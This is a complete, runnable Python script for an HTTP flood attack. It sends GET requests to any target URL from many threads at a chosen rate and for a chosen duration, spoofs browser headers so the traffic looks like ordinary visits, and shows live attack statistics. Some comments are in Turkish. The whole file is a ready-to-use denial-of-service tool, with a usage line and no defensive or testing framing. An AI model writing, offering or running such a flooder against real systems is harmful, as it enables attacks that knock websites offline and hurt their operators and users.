#!/usr/bin/env python3
# http_flood_rps.py

import requests
import threading
import time
import sys
from queue import Queue

class HTTPFlood:
    def __init__(self, target, rps=1000, threads=50, duration=60):
        self.target = target
        self.rps = rps
        self.threads = threads
        self.duration = duration
        self.request_count = 0
        self.start_time = time.time()
        self.running = True
        self.lock = threading.Lock()
        
    def send_request(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0'
        }
        
        try:
            response = requests.get(self.target, headers=headers, timeout=3)
            with self.lock:
                self.request_count += 1
        except:
            pass
    
    def worker(self):
        while self.running:
            elapsed = time.time() - self.start_time
            if elapsed > self.duration:
                self.running = False
                break
            
            # RPS kontrolü
            with self.lock:
                current_rps = self.request_count / elapsed if elapsed > 0 else 0
            
            if current_rps < self.rps:
                self.send_request()
            else:
                time.sleep(0.001)  # Kısa bekle
    
    def stats_display(self):
        while self.running:
            elapsed = time.time() - self.start_time
            with self.lock:
                rps_current = self.request_count / elapsed if elapsed > 0 else 0
                total = self.request_count
            
            print(f"\r[+] Requests: {total} | Current RPS: {rps_current:.2f} | Target RPS: {self.rps} | Time: {elapsed:.1f}s", end='')
            sys.stdout.flush()
            time.sleep(0.5)
    
    def start(self):
        print(f"[+] Starting HTTP Flood")
        print(f"[+] Target: {self.target}")
        print(f"[+] Target RPS: {self.rps}")
        print(f"[+] Threads: {self.threads}")
        print(f"[+] Duration: {self.duration}s")
        print(f"[+] Press Ctrl+C to stop\n")
        
        # Stats thread başlat
        stats_thread = threading.Thread(target=self.stats_display, daemon=True)
        stats_thread.start()
        
        # Worker threads başlat
        workers = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker, daemon=True)
            t.start()
            workers.append(t)
        
        # Bekle
        try:
            for t in workers:
                t.join()
        except KeyboardInterrupt:
            print("\n[!] Stopping...")
            self.running = False
        
        print(f"\n[+] Finished! Total requests: {self.request_count}")
        print(f"[+] Average RPS: {self.request_count / (time.time() - self.start_time):.2f}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 http_flood_rps.py <target_url> [rps] [threads] [duration]")
        print("Example: python3 http_flood_rps.py https://example.com 1000 50 60")
        sys.exit(1)
    
    target = sys.argv[1]
    rps = int(sys.argv[2]) if len(sys.argv) > 2 else 1000
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 50
    duration = int(sys.argv[4]) if len(sys.argv) > 4 else 60
    
    flooder = HTTPFlood(target, rps, threads, duration)
    flooder.start()